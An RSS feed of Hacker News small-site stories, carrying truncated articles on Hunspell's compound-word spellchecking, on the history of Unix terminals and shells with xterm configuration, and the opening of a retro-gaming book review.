<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Sun, 17 Jan 2021 09:05:08 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Sun, 17 Jan 2021 09:05:08 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Rebuilding the spellchecker, pt.3: Lookup–compounds and solutions]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25789099">thread link</a>) | @zverok
<br/>
January 15, 2021 | https://zverok.github.io/blog/2021-01-14-spellchecker-3.html | <a href="https://web.archive.org/web/*/https://zverok.github.io/blog/2021-01-14-spellchecker-3.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <p><strong><em>This is the third part of the “Rebuilding the spellchecker” series, dedicated to the explanation of how the world’s most popular spellchecker Hunspell works.</em></strong></p>

<p><strong>Quick recap</strong>:</p>

<ol>
  <li>In the <strong><a href="https://zverok.github.io/blog/2021-01-05-spellchecker-1.html">first part</a></strong>, I’ve described what Hunspell is; and why I decided to rewrite it in Python. It is an <strong>explanatory rewrite</strong> dedicated to uncovering the knowledge behind the Hunspell by “translating” it into a high-level language, with a lot of comments.</li>
  <li>In the <strong><a href="https://zverok.github.io/blog/2021-01-09-spellchecker-2.html">second part</a></strong> I’ve covered the basics of the <strong>lookup</strong> (word correctness check through the dictionary) algorithm, including <em>affix compression</em>.</li>
</ol>

<p>This part is a carry-over of <strong>lookup algorithm explanation</strong>, dedicated to <strong>word compounding</strong> and some less complicated but nonetheless important concerns: word case and word-breaking. To understand this part, reading <a href="https://zverok.github.io/blog/2021-01-09-spellchecker-2.html">the previous one</a> is strongly suggested. At very least you should remember that there are <em>stems</em> with <em>flags</em>, specified by <code>.dic</code>-file, with the meaning of flags defined in <code>.aff</code>-file.</p>

<h2 id="word-compounding">Word compounding</h2>

<p>Many languages, like German, Dutch, or Norvegian, have <em>word compounding</em>: two stems can be joined together, producing the new word. To check the spelling of the word in the language with compounding, the spellchecker needs to break it into all possible parts, and check if there exists a combination of parts such that all parts would be correct words that are allowed inside compound words.</p>

<p>Hunspell has two independent mechanisms to specify the compounding logic of a language in aff-file: <strong>per-stem flags</strong>, and <strong>regexp-like rules</strong>. Sometimes both mechanisms are used in the same dictionary.</p>

<h3 id="per-stem-flag-checks">Per-stem flag checks</h3>

<p>There is a generic <code>COMPOUNDFLAG</code> directive to specify a flag, which, when attached to a stem, means “this stem can be anywhere in a compound” (examples from LibreOffice’s Norvegian dictionary):</p>

<div><div><pre><code># In nb_NO.aff:
...
# Directive defines: any word with "z" flag is allowed to be in a compound
COMPOUNDFLAG z

# In nb_NO.dic:
...
fritt/CEGKVz
...
røyk/AEGKVWz
</code></pre></div></div>

<p>Both <code>fritt</code> (“free”) and <code>røyk</code> (“smoke”) have <code>z</code> flag, which means they could be in any place in compound word, and thus, “røykfritt” (“smoke-free” = “non-smoking”) is a valid one—and “frittrøyk” too<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>.</p>

<p>There are also more precise <code>COMPOUNDBEGIN</code>/<code>COMPOUNDMIDDLE</code>/<code>COMPOUNDEND</code> directives, setting the flags for stems which can be only at a certain place in compounds. Flags designated by those directives could be freely mixed: a compound can consist of a part marked with generic <code>COMPOUNDFLAG</code>, and another part marked with <code>COMPOUNDEND</code>.</p>

<p>To check the compound word for correctness, Hunspell needs to chop off the beginning of the word, of every possible length, and check if it is a valid stem which is allowed at the beginning of the compound. If so, the algorithm recursively chops the next parts, till the whole word is split into compound parts (or no suitable parts found).</p>

<p>Note that depending on the word’s length, and on how many dictionary words are allowed to be in compounds, the loop can take quite some time: the process we described in the <a href="https://zverok.github.io/blog/2021-01-09-spellchecker-2.html">previous part</a> (affix-based search of the correct form) can be repeated dozens of times for various “part candidates”.</p>

<blockquote>
  <p>Let <a href="https://spylls.readthedocs.io/en/latest/hunspell/algo_lookup.html#spylls.hunspell.algo.lookup.Lookup.compounds_by_flags"><code>Lookup.compound_by_flags</code></a> in Spylls documentation be your guide!</p>
</blockquote>

<h3 id="defining-compounds-as-regexp-like-rules">Defining compounds as regexp-like rules</h3>

<p>There is another way to specify compounding logic. It is implemented by <code>COMPOUNDRULE</code> directive, with statements like <code>A*B?C</code> (meaning, “correct compound consists of any number of words with the flag <code>A</code>, then one or zero words with the flag <code>B</code>, then a mandatory word with the flag <code>C</code>”). The most common use of it is specifying suffixes in numerals. For example, in the <code>en_US</code> dictionary:</p>

<div><div><pre><code># en_US.aff
COMPOUNDRULE 2     # we have 2 compound rules listed below
COMPOUNDRULE n*1t  # rule 1: any number (*) of "n"-marked stems, then "1"-marked stem, then "t"-marked stem
COMPOUNDRULE n*mp  # rule 2: any number (*) of "n"-marked stems, then "m"-marked stem, then "p"-marked stem

# en_US.dic
# ...defines numbers as "stems" for this rule:
0/nm
1/n1
2/nm
3/nm
4/nm
5/nm
6/nm
7/nm
8/nm
9/nm
# ...and numerical suffixes as stems, with different flags, too!
0th/pt
1st/p
1th/tc
2nd/p
2th/tc
3rd/p
3th/tc
4th/pt
5th/pt
6th/pt
7th/pt
8th/pt
9th/pt
</code></pre></div></div>

<p>This leads to Hunspell being able to say that “1201st” is correct (the rule <code>n*mp</code> matched: “1” and “2” with “n” flags, “0” with “m”, and “1st” with “p”), and “1211th” is correct (another rule in action: <code>n*1t</code>), but “1211st” is not.</p>

<p>Handling the word correctness check in a presence of the <code>COMPOUNDRULE</code> requires to again recursively split word into possible parts—but this time already found parts should be checked for a partial match against known rules.</p>

<blockquote>
  <p><a href="https://spylls.readthedocs.io/en/latest/hunspell/algo_lookup.html#spylls.hunspell.algo.lookup.Lookup.compounds_by_rules">Lookup.compound_by_rules</a> implements this in a complicated, yet concise way.</p>
</blockquote>

<h3 id="but-wait-there-is-more">But wait, there is more!</h3>

<p><del>To make things more complicated</del> To match the complexity of real life, both algorithms of compound words checking need to consider:</p>

<ul>
  <li>Numeric <strong>limitations</strong>: some dictionaries might limit the minimum size of a part of the compound, or the maximum number of parts.</li>
  <li><strong>Affixes:</strong> By default, any prefix is allowed at the beginning of the compound word, and any suffix is allowed at the end; and yet, some affixes might have flags saying “it should never be in any compound”, and some others might have flags saying “it is allowed <em>in the middle</em> of the compound” (e.g. prefix to non-first or suffix to a non-last part).</li>
  <li><strong>Several rules</strong> that, being present in aff-file, reject some compound words with seemingly correct parts as incorrect: for example, if the letter at the boundary of the compound is tripled (<code>fall+lucka</code>); if some parts of the compound are repeated (<code>dubb+bon+bon</code>); if the non-first part of the compound is capitalized, or “this regexp-like pattern is prohibited at the boundary of the compound parts”, and so on.</li>
  <li>Some of those settings might lead to a whole <strong>new word checking loop</strong> in the middle of compound checking: for example, <code>CHECKCOMPOUNDREP</code> setting tells the algorithm: use the <code>REP</code>-table specified in aff-file (typical misspelled sequences of letters, like “f=&gt;ph”, usually used on suggest) to check if some part of the compound, with replacement applied, is the valid word. If yes, then it is an incorrect compound! E.g. “badabum” split into parts “ba”, “da”, “bum”, but then, if we apply the replacement “u=&gt;oo”, turns out “daboom” is a correct non-compound word… Then we should consider “badabum” a misspelling, and the “ba daboom” is most probably what was misspelled.</li>
</ul>

<blockquote>
  <p>Are you thrilled? Then follow the <a href="https://spylls.readthedocs.io/en/latest/hunspell/algo_lookup.html#spylls.hunspell.algo.lookup.Lookup.compound_forms"><code>Lookup.compound_forms</code></a> docs to uncover even more dirty details.</p>
</blockquote>

<h2 id="and-other-complications">…and other complications</h2>

<p>Affix check and (de)compounding are the main parts of the algorithm, yet there is more! Just a brief overview to give you some taste:</p>

<ul>
  <li>Words case: “kitten” can be spelled “Kitten” or “KITTEN”, but “Paris” can’t be spelled “paris”
    <ul>
      <li>…but, the word might have a flag defined as <code>KEEPCASE</code> in aff-file, meaning it should be ONLY in the exact case as in the dictionary;</li>
      <li>…and there are complications with the German language: “SS” can be downcased as “ss” or “ß” (“sharp s”), and both should be checked through the dictionary, and also, when the word is uppercased, it is allowed to have “ß”: “STRAßE”;</li>
      <li>…and in Turkic languages casing rules for “i” are different: “i=&gt;İ” and “I=&gt;ı”;</li>
      <li>…and the ending part of the compound might have a flag saying “this compound should be titlecased”: in Swedish dictionary, there are special words like “afrika”, which are allowed only at the end of compounds, and require the whole compound to be in titlecase: “Sydafrika” (South Afrika);</li>
    </ul>
  </li>
  <li>Word breaking: “foo-bar” should be checked as the whole word, and also as two separate words “foo” and “bar”
    <ul>
      <li>…unless aff-file redefines this, by prohibiting word-breaking, or changing by which patterns words should be broken.</li>
    </ul>
  </li>
  <li>Some words might be present in the dictionary with a flag defined as <code>FORBIDDENWORD</code>: it is used to disallow words that are logically possible (allowed stem with allowed suffix), but this specific combination is incorrect in the language.</li>
  <li>There might be an <code>ICONV</code> (“input conversions”) directive defined in aff-file, saying which chars convert before the spellchecking: for example, replacement of several kinds of typographic apostrophes with simple <code>'</code> to simplify the dictionary, or unpacking the ligatures (<code>ﬁ</code> → <code>fi</code>).
    <ul>
      <li>But this feature can be used not only for handling fancy typography: for example, the Dutch dictionary uses it for enforcing proper case of “ij”: In Dutch, it is considered a single entity and both letters should always have the same case. It is achieved by <code>ICONV</code>-ing to ligatures: <code>ij</code>→<code>ĳ</code> and <code>IJ</code>→<code>Ĳ</code> (but <code>Ij</code> wouldn’t be converted, and wouldn’t be found in a dictionary, as all dictionary words also contain ligatures).</li>
    </ul>
  </li>
  <li>An <code>IGNORE</code> directive, defined in aff-file, says which characters to drop before spellchecking (in Arabic and Semitic languages, where vowels may be present but should be ignored).</li>
</ul>

<p>That’s mostly the size of it!</p>

<blockquote>
  <p>To go for the full ride, start reading the Spylls docs from the <a href="https://spylls.readthedocs.io/en/latest/hunspell/algo_lookup.html#spylls.hunspell.algo.lookup.Lookup.__call__"><code>Lookup.__call__</code></a> method. You won’t be disappointed!</p>
</blockquote>

<h2 id="lookup-takeout">Lookup: takeout</h2>

<p>To reiterate on everything said above: There are good and useful dictionaries for spellchecking of many languages, freely available in Hunspell’s format, and one might be tempted to reuse them in own code. But the process of going from the not-that-complicated input format to a full reliable spellchecking includes at least:</p>

<ul>
  <li><em>Reading of aff-files (consisting of multiple directive “types”, with reading logic depending on particular directive) and dic-files (words with flags)—we’ll talk about this interesting task in later installments<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>;</em></li>
  <li>Affix analysis: either on-the-fly (how Hunspell and Spylls do), or once: “unpack” the list of stems with flags into words with affixes;</li>
  <li>Compounding analysis—unless you just want to omit the support for languages with compounding (this apparently <em>can’t</em> be solved with a pre-generated list of “all correct compound words”);</li>
  <li>Handling of complications with word breaking, text case, special characters, and whatnot.</li>
</ul>

<p>Some of those tasks are …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://zverok.github.io/blog/2021-01-14-spellchecker-3.html">https://zverok.github.io/blog/2021-01-14-spellchecker-3.html</a></em></p>]]>
            </description>
            <link>https://zverok.github.io/blog/2021-01-14-spellchecker-3.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25789099</guid>
            <pubDate>Fri, 15 Jan 2021 10:19:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The terminal, the console and the shell – what are they?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25788858">thread link</a>) | @iio7
<br/>
January 15, 2021 | https://www.unixsheikh.com/articles/the-terminal-the-console-and-the-shell-what-are-they.html | <a href="https://web.archive.org/web/*/https://www.unixsheikh.com/articles/the-terminal-the-console-and-the-shell-what-are-they.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>


<p>Published on <span id="pubdate">2021-01-13</span>. Modified on <span id="moddate">2021-01-16</span>.</p>
<p>The other day, as I was going through some of my old notes, I stumbled upon something I had written about the console, the terminal and the shell on Unix-like operating systems. I have decided to rewrite these notes in order to share them here on my website. So without further ado we will now stroll down memory lane and take a quick look at the origins of the Unix terminal and shell. And I will also give my advice to new users on Linux or BSD regarding the choice of terminal emulator and shell.</p>

<p>Table of contents</p>
<ul>
    <li><a href="#the-terminal">The terminal and the console</a>
        <ul>
            <li><a href="#the-virtual-terminal">The virtual terminal</a></li>
        </ul>
    </li>
    <li><a href="#the-terminal-emulator">The terminal emulator</a>
        <ul>
            <li><a href="#xterm">xterm</a></li>
            <li><a href="#st">st</a></li>
            <li><a href="#alacritty">Alacritty</a></li>
            <li><a href="#other-terminal-emulators">Other terminal emulators</a></li>
            <li><a href="#what-terminal-emulator-should-i-use">What terminal emulator should I use?</a></li>
        </ul>
    </li>
    <li><a href="#terminal-multiplexer">Terminal multiplexer</a>
        <ul>
            <li><a href="#tmux-vs-gnu-screen">tmux vs GNU Screen</a></li>
        </ul>
    </li>
    <li><a href="#the-environment-variable-term">The environment variable TERM</a></li>
    <li><a href="#escape-sequences">Escape sequences</a></li>
    <li><a href="#the-shell">The shell</a>
        <ul>
            <li><a href="#popular-shells">Popular shells</a>
                <ul>
                    <li><a href="#bourne-shell">Bourne shell</a></li>
                    <li><a href="#c-shell">C shell</a></li>
                    <li><a href="#ksh">Ksh</a></li>
                    <li><a href="#bash">Bash</a></li>
                    <li><a href="#tcsh">tcsh</a></li>
                    <li><a href="#zsh">Zsh</a></li>
                    <li><a href="#ash">Ash</a></li>
                    <li><a href="#dash">DASH</a></li>
                    <li><a href="#fish">fish</a></li>
                </ul>
            </li>
            <li><a href="#what-shell-should-i-use">What shell should I use?</a></li>
        </ul>
    </li>
    <li><a href="#further-reading">Further reading</a></li>
</ul>

<h2 id="the-terminal-and-the-console">The terminal and the console</h2>

<p>Early computers where huge machines that consisted of multiple cabinets, e.g. one cabinet for the CPU, one or more cabinets for tape drives, one cabinet for each disk drive, one cabinet for a punched card reader and one cabinet for a high speed printer. The image below is a Univac 9400 system from 1967 consisting of several cabinets.</p>

<p><img src="https://www.unixsheikh.com/includes/images/univac-9400.jpg" alt="A Univac 9400 Mainframe"><br><span>A Univac 9400 mainframe computer.</span></p>

<p>The "console" was the "control console". In the pictures below is a "UNIVAC 1" control console and a "UNIVAC 2" control console.</p>

<p><img src="https://www.unixsheikh.com/includes/images/univac-1-control-console.png" alt="UNIVAC 1 control console"><br><span>A UNIVAC 1 control console.</span></p>

<p><img src="https://www.unixsheikh.com/includes/images/univac-2-control-console.png" alt="UNIVAC 2 control console"><br><span>A UNIVAC 2 control console.</span></p>

<p>The word terminal comes from the Latin "terminus", meaning "an end, a limit, boundary line", indicating that it's the terminating end or "terminal" end of a communications process. You will sometimes hear the description "a dumb terminal" when referring to a text-based environment where the computer is <i>just taking input and showing text</i> while the real work happens at the other end, typically in a <a href="https://en.wikipedia.org/wiki/Mainframe_computer">mainframe</a>.</p>

<p>The <a href="https://en.wikipedia.org/wiki/Teleprinter">teleprinter</a> or TTY was the first kind of terminal. Rather than a monitor you would have a literal typewriter in front of you. When you typed on it, you would see the text on a piece of paper and that text would be send to the computer. When the computer replied, you would see the typewriter print on the paper. Some models could also be used to create punched tape for data storage (either from typed input or from data received from a remote source) and to read back such tape for local printing or transmission.</p>

<p>In the picture below is a Teletype 33 ASR Teleprinter. It was introduced in 1963 as an electro-mechanical teleprinter and it was one of the most popular terminals in the communications industry. The ASR stands for <b>A</b>utomatic <b>S</b>end and <b>R</b>eceive. The ASR 33 had a built-in punched tape reader and tape punch which allowed the user to save programs.</p>

<p><img src="https://www.unixsheikh.com/includes/images/asr33.jpg" alt="33 ASR Teleprinter"><br><span>A Teletype Model 33 ASR teleprinter, usable as a terminal.</span></p>

<p><b>NOTE:</b><br>If you're interested I can highly recommend that you take a look at Charles Baetsen's Hobby Page as he has a wealth of information about the <a href="https://va3ngc.weebly.com/asr-33-documentation.html">Teletype 33 ASR</a> in the form of both user manuals, installations manuals and videos.</p>

<p>In the picture below Ken Thompson (sitting) and Dennis Ritchie (standing) is using a 33 ASR teleprinter connected to a <a href="https://en.wikipedia.org/wiki/PDP-11">PDP-11</a>, the picture is from 1972.</p>

<p><img src="https://www.unixsheikh.com/includes/images/thompson-ritchie-pdp-11.png" alt="Ken Thompson and Dennis Ritchie"></p>

<p>Later, as computers became much smaller, it was possible to integrate multiple components into one single unit, with both a video monitor and a keyboard put together inside it, and the "console" now became more or less synonymous to the "terminal". Both the "console" and the "terminal" now referred to the physical video terminal that had replaced both the teleprinter and the old control console.</p>

<p>The video terminal provides a way for the kernel and other processes to send text output on the monitor to the user, and to receive text input from the user via the keyboard.</p>

<p>The VT100 is a video terminal, introduced in August 1978 by Digital Equipment Corporation (DEC). It was one of the first terminals to support ANSI escape codes for cursor control and other tasks, and added a number of extended codes for special features like controlling the status lights on the keyboard. This led to rapid uptake of the ANSI standard, becoming the de facto standard for terminal emulators.</p>

<p><img src="https://www.unixsheikh.com/includes/images/dec-vt100.jpg" alt="DEC VT100"><br><span>A DEC VT100</span></p>

<p>The VT220 is an ANSI standard video terminal introduced by Digital Equipment Corporation (DEC) in November 1983. The VT240 added monochrome vector graphics support to the base model, while the VT241 did the same in color. The 200 series replaced the VT100 series. Among its major upgrades was a number of international character sets, as well as the ability to define new character sets, and a much lighter keyboard.</p>

<p><img src="https://www.unixsheikh.com/includes/images/dec-vt220.jpg" alt="DEC VT220"><br><span>A DEC VT220</span></p>

<p>Today, in the software world, "console" and "terminal" has become completely synonymous.</p>

<h3 id="the-virtual-terminal">The virtual terminal</h3>

<p>A virtual terminal or virtual console is a program that simulates a physical terminal. For example, both the Linux kernel and BSD kernels support virtual terminals - terminals that are logically separate, but which access the same physical keyboard and monitor.</p>

<p>The virtual terminal gives the impression that several independent terminals are running concurrently. Each virtual terminal can be logged in with a different user and it can run its own shell and have its own font settings. The virtual terminals each use a device <code>/dev/ttyX</code>, and you can switch between them by pressing <code>Alt+FX</code> (where <code>X</code> is equal to the virtual terminal number, beginning with 1).</p>

<h2 id="the-terminal-emulator">The terminal emulator</h2>

<p>Emulation refers to the ability of a computer program to emulate, i.e. imitate, another program or device. A terminal emulator is a computer program that emulates a physical terminal within some other display architecture, such as the <a href="https://en.wikipedia.org/wiki/X_Window_System">X Window System</a>.</p>

<p>Many different terminal emulators have been developed that emulate terminals such as the <a href="https://en.wikipedia.org/wiki/VT52">VT52</a>, <a href="https://en.wikipedia.org/wiki/VT100">VT100</a>, <a href="https://en.wikipedia.org/wiki/VT220">VT220</a>, <a href="https://en.wikipedia.org/wiki/VT320">VT320</a>, <a href="https://en.wikipedia.org/wiki/IBM_3270">IBM 3270/8/9/E</a>, <a href="https://en.wikipedia.org/wiki/IBM_5250">IBM 5250</a>, and many others.</p>

<p>The terminal emulator takes the input you type at the keyboard and convert those to <a href="https://en.wikipedia.org/wiki/ASCII">ASCII</a> characters which it sends to the shell, or to a program running under the shell (more about the shell later). The terminal emulator also takes the stream of output characters from the various programs you run via the shell and displays them on the monitor.</p>

<p>The purpose of the terminal emulator is to allow access to the command line while working in a graphical user interface, such as the X Window System. Since the shell is "expecting" to interface with a human through a terminal, and we don't use a physical terminal while in a graphical environment, we need the terminal emulator.</p>

<p>You can see what terminal types are available on most Linux distributions by running <code>ls /lib/terminfo/*</code> (the path may be different on your system). On OpenBSD it's <code>ls /usr/share/terminfo/*</code></p>

<h4 id="xterm">xterm</h4>

<p><a href="https://invisible-island.net/xterm/xterm.html">xterm</a> was originally written as a stand-alone terminal emulator for the <a href="https://en.wikipedia.org/wiki/VAXstation#VAXstation_100">VAXStation 100 </a> (VS100) by Mark Vandevoorde, a student of <a href="https://en.wikipedia.org/wiki/Jim_Gettys">Jim Gettys</a>, who worked at <a href="https://en.wikipedia.org/wiki/Digital_Equipment_Corporation">DEC's</a> Cambridge Research Laboratory. It became clear that xterm would be more useful as part of X Window System than as a standalone program, so it was retargeted to the X Window System.</p>

<p>The xterm program is the default terminal emulator for the X Window System. It provides DEC VT102/VT220 features and other selected features from higher-level terminals such as VT320, VT420 and VT520. It also provides Tektronix 4014 emulation for programs that cannot use the window system directly. If the underlying operating system supports terminal resizing (for example, the SIGWINCH signal in systems derived from 4.3bsd), xterm will use the facilities to notify programs running in the window whenever it is resized.</p>

<p>Around 1996 the main line of development shifted to the <a href="https://en.wikipedia.org/wiki/XFree86">XFree86</a> implementation of the X Window System and xterm is now maintained by Thomas Dickey, who is also the current lead developer of <a href="https://en.wikipedia.org/wiki/Lynx_%28web_browser%29">Lynx</a>, a popular customizable text-based web browser.</p>

<p>Early versions of xterm emulated the VT102 and Tektronix 4014. Later versions added control sequences for DEC and other terminals such as:</p>
<ul>
    <li>VT220: Added in patch 24.</li>
    <li>VT320: Added in patch 24.</li>
    <li>VT420: DECSTR (soft terminal reset) was added in patch 34.</li>
    <li>VT520: Although not officially emulated, parts of VT520 features were implemented. Controls DECSMBV and DECSWBV for setting the margin- and warning-bell volume was added in patch 254.</li>
</ul>

<p>As with most X applications, xterm can be customized via global X resources files (e.g. <code>/usr/lib/X11/app-defaults/XTerm</code>), per-user resource files (e.g. <code>~/.Xresources</code>), or command-line arguments. Most of the command-line options correspond to resource settings, as noted in the <a href="https://man.archlinux.org/man/extra/xterm/xterm.1.en">xterm manual page</a>.</p>

<p>While the name of the program is xterm, the X resource class in <code>~/.Xresources</code> is <code>XTerm</code>, e.g.:</p>

<pre>XTerm*utf8: 1</pre>

<p>The <a href="https://man.archlinux.org/man/extra/xterm/xterm.1.en">xterm manual page</a> provides a full list of features and options.</p>

<p>xterm is still being actively developed, it works really great across many different systems, it has extremely low input latency, it has many hidden gems and it is my favorite terminal emulator! For that reason I'm going to share some settings you can use in your <code>~/.Xresources</code> file:</p>

<pre>XTerm*faceName: "DejaVu Sans Mono"
XTerm*faceSize: 12
XTerm*renderFont: true
! Dynamically change font size with CTRL+SHIFT+PageUp/PageDown
XTerm*faceSize1: 12
XTerm*faceSize2: 14
XTerm*faceSize3: 16
XTerm*faceSize4: 18
XTerm*faceSize5: 20
XTerm*faceSize6: 22
XTerm*utf8: 1
XTerm*termName: xterm-256color
XTerm*borderWidth: 0
XTerm*autohint: true
XTerm*backarrowKey: false
XTerm*bellIsUrgent: false
XTerm*cursorBlink: false
XTerm*ScrollKey: true
! Fix ALT key (check in mc with Alt+h)
XTerm*metaSendsEscape: true
XTerm*eightBitInput: false
XTerm*ttyModes: erase ^?
XTerm*fastScroll: true

! I like a lot of scrollback.
XTerm*saveLines: 100000

! Use CLIPBOARD by default.
XTerm*selectToClipboard: true
! Hack xterm to add selection to both PRIMARY and CLIPBOARD.
&lt;Btn1Up&gt;: select-end(PRIMARY, CLIPBOARD, CUT_BUFFER0)

! xterm defines a whole suite of …</pre></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.unixsheikh.com/articles/the-terminal-the-console-and-the-shell-what-are-they.html">https://www.unixsheikh.com/articles/the-terminal-the-console-and-the-shell-what-are-they.html</a></em></p>]]>
            </description>
            <link>https://www.unixsheikh.com/articles/the-terminal-the-console-and-the-shell-what-are-they.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788858</guid>
            <pubDate>Fri, 15 Jan 2021 09:44:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Book Review: The Games That Weren’t by Frank Gasking]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25788647">thread link</a>) | @rbanffy
<br/>
January 15, 2021 | https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/ | <a href="https://web.archive.org/web/*/https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1547">
	
	<div>
		
<p>Towards the end of of 1985, adverts started appearing in my Computer &amp; Video Games magazines for “the first ever computer cartoon” – Scooby Doo in the Castle Mystery! And to a massive Scooby Doo fan like me, it was incredible! They were clearly Spectrum screenshots on there, but they definitely looked like nothing else, except maybe what a Spectrum port of something like Dragon’s Lair might look like… which, the following year, we’d find out was more or less the case!</p>



<figure><img data-attachment-id="1537" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2381/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg" data-orig-size="2863,3817" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1610281833&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;320&quot;,&quot;shutter_speed&quot;:&quot;0.016666666666667&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2381" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=225" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=768" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=768 768w, https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=1536 1536w, https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=113 113w, https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=225 225w" sizes="(max-width: 768px) 100vw, 768px"></figure>



<p>Anyway, as 1985 became 1986, previews started appearing that hinted at an interactive story involving a spooky Scottish castle belonging to Shaggy’s aunt, presented as cartoon action sequences that you directed to solve the mystery. And yes, it really was like a laser-disc game crammed into a 48K Spectrum! As the months passed, the big double-page, full colour adverts kept coming, but no sign of any game, then in March 1986, in an Elite preview exclusive, C&amp;VG said “despite what you’ve read in other magazines, Elite still plans to release its computer cartoon adventure, Scooby Doo in the Castle Mystery for the 48K Spectrum,” but towards the end of the article also says that it won’t be in the “heavily advertised” form because there wasn’t enough memory left to make it playable! And, of course, what we eventually got at the end of 1986 was the fantastic, but utterly brutal Scooby Doo, an arcade-platformer take on Kung-Fu Master, with some of my favourite graphics ever on the Spectrum! </p>



<figure><img data-attachment-id="1538" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/scooby-doo-180901-180209/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg" data-orig-size="960,720" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="scooby doo-180901-180209" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=960" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg 960w, https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=768 768w" sizes="(max-width: 960px) 100vw, 960px"></figure>



<p>As much as I love what we finally got, I still look at the original advert and wonder what could have been… And I would have gotten away with it too, if it weren’t for you meddling 48K of memory! If only Sir Clive had come up with 128K a bit sooner it might all be different, but that’s the tale of my very first encounter with a game that weren’t. Wasn’t!</p>



<p>Fast forward to Christmas 2021, and I received a wonderful new book called The Games That Weren’t, written by Frank Gasking and published by my favourite retro-gaming book peddlars Bitmap Books, who are responsible for all kinds of equally wonderful stuff on my bulging bookshelves, but nothing that bulges quite as much as this 644-page hardback behemoth!</p>



